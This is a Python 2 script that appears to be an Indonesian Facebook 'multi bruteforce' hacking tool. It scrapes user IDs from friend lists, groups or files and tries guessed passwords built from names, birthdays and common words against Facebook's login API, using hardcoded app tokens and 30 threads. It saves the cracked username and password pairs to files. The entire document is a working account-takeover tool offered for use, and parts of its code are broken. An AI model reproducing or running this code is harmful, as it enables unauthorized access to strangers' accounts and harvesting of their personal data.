#!/usr/bin/python2
# coding=utf-8
#AUTHOR 4NJ4SMAR3
#HAMPURA SLUR MASIH ACAK"KAN

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]




reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

h = '\x1b[32m'
r = '\x1b[1;91m'
k = '\x1b[1;97m'
n = '\033[94m'
W = "\033[0m"
G = '\033[32;1m'
R = '\033[31;1m'
i="\033[32m" #hijau
cg="\033[36m" #cyan gelap
k="\033[33;1m" #kuning
p="\033[0m" #putih
ba="\033[96;1m" #biruaqua
pu="\033[35m" # #purple
gr="\033[37m" #putih terang
pb="\033[47m" #putihbold
m="\033[31m" #merah
b="\033[34m" # Biru

def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()

def lisensi():
	os.system('clear')
	print logo
	print 'Tools Ini membutuhkan Lisensi'
	print
	lisen = raw_input("\033[33m[?] \033[37mLISENSI : \033[32m")
	if lisen < 5:
		print "\033[31m[-] Lisensi Salah Gan :v"
		raw_input("\033[34m[?] Enter Untuk Mengulang")
		lisensi()
	elif lisen == "anjas210":
		print "\033[37m[+] Succesfuly"
		time.sleep(5)
#		menu()
	elif lisen == "bl4ckdr460n":
		print "\033[32m[+] Succesfuly"
                time.sleep(5)
#                menu()
	else:
		print "\033[31m[-] Lisensi Salah Gan :v"
		raw_input("\033[34m[?] Enter Untuk Mengulang")
		lisensi()

	
def tik():
    animation = '|/-\\'
    for i in range(100):
        time.sleep(0.003)
        sys.stdout.write('\r[!] Cheking My acces token \x1b[1;97m' + animation[(i % len(animation))])
        sys.stdout.flush()
        
 
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
	

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
logo = """
\033[1;92m
    __ __            __        __
   / //_/___  ____  / /_____  / /
  / ,< / __ \/ __ \/ __/ __ \/ / 
 / /| / /_/ / / / / /_/ /_/ / /  
/_/ |_\____/_/ /_/\__/\____/_/ 
(\033[1;93mMulti Bruteforce By 4njas)

\033[31;1m                               """

merah = '\x1b[1;90m'
lime = '\x1b[1;90m'
kuning = '\x1b[1;90m'
biru = '\x1b[1;90m'
ungu = '\x1b[1;90m'
blue = '\x1b[1;90m'
putih = '\x1b[1;90m'
tutup = '\x1b[0m'        
back = 0
lol = []
threads= []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman= []
idmem = []
id = []
em = []
emfromteman = []
emmem=[]
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
lol = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print' [+] Login your account facebook'
		id = raw_input('\x1b[1;95m [+] \x1b[0;0mEmail : ')
		pwd = raw_input('\x1b[1;95m [+] \x1b[0;0msandi : ')
	
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				anjas = open("login.txt", 'w')
				anjas.write(z['access_token'])
				anjas.close()
				print '[✓]Login Berhasil\n'
				os.system('')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mIdupin datanya Njir"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;93mSepertinya akun anda kena checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(0.001)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(0.001)
			login()
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken tidak ditemukan"
		os.system('rm -rf login.txt')  
		time.sleep(1)
		keluar()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
		keluar()
	os.system("clear")
	print logo 
	
	print "\033[1;91m[\033[1;96m#\033[1;91m]\033[1;97m Welcom \033[1;91m+> \033[1;93m"+nama+"\033[1;97m"
	print ' '
	print '\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;90mFind Phone User'
	print '\x1b[1;93m[\x1b[1;91m2\x1b[1;93m] \x1b[1;90mFind birthday'
	print '\x1b[1;93m[\x1b[1;91m3\x1b[1;93m] \x1b[1;90mFind User ID friend'
	print '\x1b[1;93m[\x1b[1;91m4\x1b[1;93m] \x1b[1;90mHack facebook'
	print '\x1b[1;93m[\x1b[1;91m5\x1b[1;93m] \x1b[1;90mDump ID'
	print '\x1b[1;93m[\x1b[1;91m6\x1b[1;93m] \x1b[1;90mBot facebook'
	print '\x1b[1;93m[\x1b[1;91m7\x1b[1;93m] \x1b[1;90mList group'
	print '\x1b[1;93m[\x1b[1;91m8\x1b[1;93m] \x1b[1;90mYahoo Cloner'
	print '\x1b[1;93m[\x1b[1;91m9\x1b[1;93m] \x1b[1;90mUnfriend Friend'
	
	print'\033[1;97m[0] Log Out'
	pilih()
  
def pilih():
	anjas = raw_input("\n\033[1;97m\033[95m[4njas]+>\033[1;93m")
	if anjas =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()
	elif anjas =="1":
		dumpge()
	elif anjas =="2":
		getlahir()
	elif anjas =="3":
		informasi()
	elif anjas =="4":
		menu_hack()
	elif anjas =="5":
		dump()
	elif anjas =="6":
		bot()
	elif anjas =="7":
		grupsaya()
	elif anjas =="8":
		yahoo()
	elif anjas =="9":
		unfriend()
	elif anjas =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()
def menu_hack():
	print ' '
	print '\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;90mBruteForce\033[1;92m (target)\033[1;97m'
	print '\x1b[1;93m[\x1b[1;91m2\x1b[1;93m] \x1b[1;90mMulti Bruteforce\033[1;92m (Auto)\033[1;97m'
	print '\x1b[1;93m[\x1b[1;91m3\x1b[1;93m] \x1b[1;90mSuperMulti Bruteforce\033[1;92m(Massal)\033[1;97m'
	print "[0]\033[1;93m Exit"
	hack = raw_input("\033[1;97m\n[?] 4njas_>")
	if hack=="":
		print "\033[1;91m[!] Wrong input"
		hack_pilih()
	elif hack =="1":
		mini()
	elif hack =="2":
		crack()
		hasil()
	elif hack =="3":
		super()
	elif hack =="4":
		brute()
	elif hack =="5":
		menu_yahoo()
	elif hack =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		hack_pilih()
##### MINI HF #####
def mini():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print("=========================================")
	print("\033[1;96m    [ Bruteforce target  ]")
	print("\x1b[1;97m=========================================")
	print " "
	try:
		id = raw_input("\033[1;91m[+] \033[1;90mTarget ID \033[1;91m:\033[1;97m ")
		jalan('\033[1;91m[!] \033[1;90mWait a minute \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		a = json.loads(r.text)
		print '\033[1;91m[+] \033[1;90mName\033[1;97m : '+a['name']
		jalan('\033[1;91m[+] \033[1;90mCheck \033[1;97m...')
		time.sleep(2)
		jalan('\033[1;91m[+] \033[1;90mOpen password \033[1;97m...')
		time.sleep(2)
		print 42*"\033[1;97m═"
		pz1 = a['first_name']+'123'
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		y = json.load(data)
		if 'access_token' in y:
			print "\033[1;91m[+] \033[1;92mFound"
			print "\033[1;91m[\033[1;90m+\033[1;91m] \033[1;90mName\033[1;91m     : "+a['name']
			print "\033[1;91m[+] \033[1;90mUsername\033[1;97m : "+id
			print "\033[1;91m[+] \033[1;90mPassword\033[1;97m : "+pz1
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu()
		else:
			if 'www.facebook.com' in y["error_msg"]:
				print "\033[1;91m[+] \033[1;92mFound"
				print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
				raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
				menu()
			else:
				pz2 = a['first_name'] + '12345'
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				y = json.load(data)
				if 'access_token' in y:
					print "\033[1;91m[+] \033[1;92mFound"
					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
					menu()
				else:
					if 'www.facebook.com' in y["error_msg"]:
						print "\033[1;91m[+] \033[1;92mFound"
						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
						menu()
					else:
						pz3 = a['last_name'] + '123'
						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						y = json.load(data)
						if 'access_token' in y:
							print "\033[1;91m[+] \033[1;92mFound"
							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
							menu()
						else:
							if 'www.facebook.com' in y["error_msg"]:
								print "\033[1;91m[+] \033[1;92mFound"
								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
								menu()
							else:
								lahir = a['birthday']
								pz4 = lahir.replace('/', '')
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								y = json.load(data)
								if 'access_token' in y:
									print "\033[1;91m[+] \033[1;92mFound"
									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
									menu()
								else:
									if 'www.facebook.com' in y["error_msg"]:
										print "\033[1;91m[+] \033[1;92mFound"
										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
										menu()
									else:
										lahirs = a['birthday']
										gaz = lahirs.replace('/', '')
										pz5 = a['first_name']+gaz
										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
										y = json.load(data)
										if 'access_token' in y:
											print "\033[1;91m[+] \033[1;92mFound"
											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
											menu()
										else:
											if 'www.facebook.com' in y["error_msg"]:
												print "\033[1;91m[+] \033[1;92mFound"
												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
												menu()
											else:
												pz6 = "sayang"
												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												y = json.load(data)
												if 'access_token' in y:
													print "\033[1;91m[+] \033[1;92mFound"
													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
													menu()
												else:
													if 'www.facebook.com' in y["error_msg"]:
														print "\033[1;91m[+] \033[1;92mFound"
														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
														menu()
													else:
														pz7 = "kontol"
														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
														y = json.load(data)
														if 'access_token' in y:
															print "\033[1;91m[+] \033[1;92mFound"
															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
															menu()
														else:
															if 'www.facebook.com' in y["error_msg"]:
																print "\033[1;91m[+] \033[1;92mFound"
																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu()
															else:
																print "\033[1;91m[!] Sorry, failed to open the target password :("
																print "\033[1;91m[!] try it another way."
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu()
	except KeyError:
		print "\033[1;91m[!] Terget not found"
		
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
										
								
##### Multi Brute Force #####
##### CRACK ####
def crack():
	global idlist,passw,file
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print " "
	idlist = raw_input('\033[1;91m[#] \033[1;97mList ID \033[1;91m: \033[1;97m')
	
	time.sleep(5)
	passw = raw_input('\033[1;91m[#] \033[1;97mPassword Cracking \033[1;91m: \033[1;97m')
	try:
		file = open((idlist), "r")
		jalan('\033[1;91m[#] \033[1;97mStart \033[1;97m...')
		for x in range(30):
			zedd = threading.Thread(target=scrak, args=())
			zedd.start()
			threads.append(zedd)
		for zedd in threads:
			zedd.join()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
		
def scrak():
	global berhasil,cekpoint,gagal,back,up
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		buka = open(idlist, "r")
		up = buka.read().split()
		while file:
			username = file.readline().strip()
			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(passw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			data = urllib.urlopen(url)
			mpsh = json.load(data)
			if back == (len(up)):
				break
			if 'access_token' in mpsh:
				bisa = open("out/anjas.txt", "w")
				bisa.write(username+"|"+passw+"\n")
				bisa.close()
				x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
				z = json.loads(x.text)
				berhasil.append("\033[1;97m[ \033[1;92m[•]\033[1;97m ] "+username+"|" +passw)
			elif 'www.facebook.com' in mpsh["error_msg"]:
				cek = open("out/mbf_cp.txt", "w")
				cek.write(username+"|"+passw+"\n")
				cek.close()
				cekpoint.append("\033[1;97m[ \033[1;93m[•]\033[1;97m ] "+username+"|" +passw)
			else:
				gagal.append(username)
				back +=1
			sys.stdout.write('\r\033[1;91m[\033[1;96m+\033[1;91m] \033[1;97mCracking \033[1;91m:\033[1;97m '+str(back)+' \033[1;96m>\033[1;97m '+str(len(up))+' |\033[1;92mlive\033[1;91m:\033[1;96m'+str(len(berhasil))+' \033[1;97m|\033[1;93mcheck\033[1;91m:\033[1;96m'+str(len(cekpoint)));sys.stdout.flush()
	except IOError:
		print"\n\033[1;91m[!] Sleep"
		time.sleep(0.01)
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		
def hasil():
	print
	print 42*"\033[1;97m═"
	###Berhasil
	for b in berhasil:
		print(b)
	###CEK
	for c in cekpoint:
		print(c)
	###Gagal
	print 42*"\033[1;97m═"
	print ("\033[31m[x] Failed \033[1;97m => " + str(len(gagal)))
	keluar()
	

def super():
	os.system('clear')
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.0)
		login()
	print logo
	print ' '
	print '\x1b[1;92m[\x1b[1;97m1\x1b[1;92m] \x1b[1;90mFrom teman'
	print '\x1b[1;92m[\x1b[1;97m2\x1b[1;92m] \x1b[1;90mFrom ID Teman '
	print '\x1b[1;92m[\x1b[1;97m3\x1b[1;92m] \x1b[1;90mFrom Group'
	print '\x1b[1;92m[\x1b[1;97m4\x1b[1;92m] \x1b[1;90mFrom List ID'
	print "\n\x1b[1;97m[0] Exit"
	pilih_super()

def pilih_super():
	peak = raw_input("\033[1;97m\033[1;91m>>> \033[1;97m")
	if peak =="":
		print "\033[1;91m[!] Wrong input"
		pilih_super()
	elif peak =="1":
		jalan('[+] \x1b[1;91mMengambil id teman\033[1;97m')
		time.sleep(1)
		jalan('[+] \x1b[1;91mSukses mengambil id\033[1;97m')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":

		
		idt = raw_input("[+] \x1b[1;91mId teman : \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m+\033[1;91m] \033[1;91mTeman found"
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('[+] Mengambil id')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		
		
		idg=raw_input('[+] \x1b[1;91mID group\033[1;91m:\033[1;91m ')
		time.sleep(1)
		print '[+] Group Found'
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=9999999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
        elif peak == "4":
                
                
                try:
                        idlist = raw_input('[+] \x1b[1;92mList ID  \033[1;91m: \033[1;97m')
                        for line in open(idlist,'r').readlines():
                                id.append(line.strip())
                except KeyError:
                        print '\033[1;91m[!] File not found'
                        raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                        super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		super()
		print "[+] \x1b[1;91m Sukses mengambil id"
        print "[+] \x1b[1;91mTotal : \033[1;92m"+str(len(id))
        
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r[+] \x1b[1;91mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
        print 42*"\033[1;97m-"
        def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			#Pass1
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print("\033[1;92m[OK]\033[1;97m"+user+" => " +pass1)
				oks.append(user+pass1)
			else:
				
					#Pass2
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.text)
						print("\033[1;92m[OK]\033[1;97m"+user+" => " +pass2)
						oks.append(user+pass2)
					else:
						
							#Pass3
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								print("\033[1;92m[OK]"+ser+" => " +pass3)
								oks.append(user+pass3)
							else:
								
									#Pass4
									pass4 = 'sayang'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										print("\033[1;92m[OK]\033[1;97m"+user+" => " +pass4)
										oks.append(user+pass4)
									else:
										
											#Pass5
											pass5 = "bangsat"
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												print("\033[1;92m[OK]"+user+" => " +pass5)
												oks.append(user+pass5)
											else:
												
													#Pass6
													pass6 = "kontol"
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
														z = json.loads(x.text)
														print("\033[1;92m[OK]\033[1;97m"+user+" => " +pass6)
														oks.append(user+pass6)
													else:
														
															#Pass7
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'anjing'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
																z = json.loads(x.text)
																print("\033[1;92m[OK]\033[1;97m"+user+" => " +pass7)
																oks.append(user+pass7)
															
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print' '
	print '[+] Program Finished !'
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu()
def dump():
	print'\n'
	print '\x1b[1;92m[\x1b[1;97m1\x1b[1;92m] \x1b[1;90mDump ID friend'
	print '\x1b[1;92m[\x1b[1;97m2\x1b[1;92m] \x1b[1;90mDump ID from friend'
